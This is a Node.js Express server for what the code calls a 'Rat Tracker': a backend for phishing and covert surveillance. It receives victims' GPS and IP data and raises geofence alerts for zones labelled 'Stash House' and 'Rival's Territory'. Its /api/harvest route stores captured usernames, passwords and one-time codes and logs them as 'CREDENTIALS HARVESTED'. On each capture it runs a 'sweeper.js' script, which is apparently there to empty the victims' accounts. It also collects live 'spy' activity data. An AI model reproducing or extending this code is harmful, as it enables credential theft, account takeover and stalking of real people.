const express = require('express');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const { exec } = require('child_process');

const app = express();
app.use(express.json());
app.use(express.static('public')); // Serve index.html, spy.js, etc.

// --- File Paths ---
const LOG_FILE = path.join(__dirname, 'logs.json');
const CRED_FILE = path.join(__dirname, 'creds.json');

// --- Helpers ---
const getLogs = () => {
    try {
        const data = fs.readFileSync(LOG_FILE);
        return JSON.parse(data);
    } catch (e) {
        return [];
    }
};

const getCreds = () => {
    try {
        const data = fs.readFileSync(CRED_FILE);
        return JSON.parse(data);
    } catch (e) {
        return [];
    }
};

// --- Geofencing Logic ---
const ZONES = [
    { name: 'House', lat: 40.7128, lon: -74.0060, radius: 300 },
    { name: 'Stash House', lat: 40.7306, lon: -73.9352, radius: 500 },
    { name: "Rival's Territory", lat: 40.6782, lon: -73.9442, radius: 1000 }
];

const distanceMeters = (lat1, lon1, lat2, lon2) => {
    const R = 6371000;
    const toRad = (d) => (d * Math.PI) / 180;
    const dLat = toRad(lat2 - lat1);
    const dLon = toRad(lon2 - lon1);
    const a = Math.sin(dLat / 2) ** 2 +
              Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) * Math.sin(dLon / 2) ** 2;
    return 2 * R * Math.asin(Math.sqrt(a));
};

const zonesInside = (lat, lon) => {
    if (lat == null || lon == null) return [];
    return ZONES.filter(z => distanceMeters(lat, lon, z.lat, z.lon) <= z.radius)
                .map(z => z.name);
};

// --- API Routes ---

// 1. Receive Tracking Data (GPS/IP)
app.post('/api/log', (req, res) => {
    const logEntry = {
        id: uuidv4(),
        ...req.body,
        timestamp: new Date().toISOString()
    };

    const inZones = zonesInside(logEntry.lat, logEntry.lon);
    if (inZones.length) logEntry.zones = inZones;

    const logs = getLogs();
    logs.push(logEntry);
    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

    console.log(`[TRACKED] User ${logEntry.id} at ${logEntry.lat || 'unknown'}`);
    if (inZones.length) console.log(`📍 ZONE ALERT: ${logEntry.id} inside [${inZones.join(', ')}]`);

    res.json({ status: 'tracked', id: logEntry.id, zones: inZones });
});

// 2. Get Logs for Dashboard
app.get('/api/logs', (req, res) => {
    res.json(getLogs());
});

// 3. Harvest Credentials
app.post('/api/harvest', (req, res) => {
    const { username, password, otp, step } = req.body;

    const entry = {
        id: uuidv4(),
        userId: req.headers['x-user-id'] || 'unknown',
        timestamp: new Date().toISOString(),
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        username: username,
        password: password,
        otp: otp || null,
        step: step || 'password'
    };

    const creds = getCreds();
    creds.push(entry);
    fs.writeFileSync(CRED_FILE, JSON.stringify(creds, null, 2));

    console.log(`🔓 CREDENTIALS HARVESTED: ${username}:${password}${otp ? ' OTP:' + otp : ''}`);

    // Trigger sweeper if you have sweeper.js
    exec('node sweeper.js', (err, stdout, stderr) => {
        if (stdout) console.log(stdout);
    });

    res.json({ status: 'success', id: entry.id });
});

// 4. Get Credentials for Dashboard
app.get('/api/harvest', (req, res) => {
    res.json(getCreds());
});

// 5. Live Spy Data (Optional, if using real-time polling)
let activeSessions = {};

app.post('/api/spy-data', (req, res) => {
    const data = req.body;
    fs.appendFileSync('activity.log', JSON.stringify(data) + '\n');
    
    if (!activeSessions[data.userId]) activeSessions[data.userId] = [];
    activeSessions[data.userId].push(data);
    if (activeSessions[data.userId].length > 100) {
        activeSessions[data.userId] = activeSessions[data.userId].slice(-100);
    }
    res.json({ status: 'logged' });
});

app.get('/api/live-feed/:userId', (req, res) => {
    res.json(activeSessions[req.params.userId] || []);
});

// Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🕵️ Rat Tracker Backend running on port ${PORT}`);
});